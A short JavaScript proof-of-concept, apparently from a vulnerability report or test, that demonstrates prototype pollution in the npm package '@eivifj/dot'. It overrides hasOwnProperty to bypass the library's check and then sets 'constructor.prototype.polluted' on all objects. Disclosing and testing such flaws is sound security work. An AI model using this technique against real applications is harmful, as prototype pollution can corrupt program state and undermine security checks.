Object.prototype.hasOwnProperty = () => true;
const a = require('@eivifj/dot');
const path = 'constructor.prototype.polluted';
console.log({}.polluted);
a.set({}, path, 'yes');
console.log({}.polluted);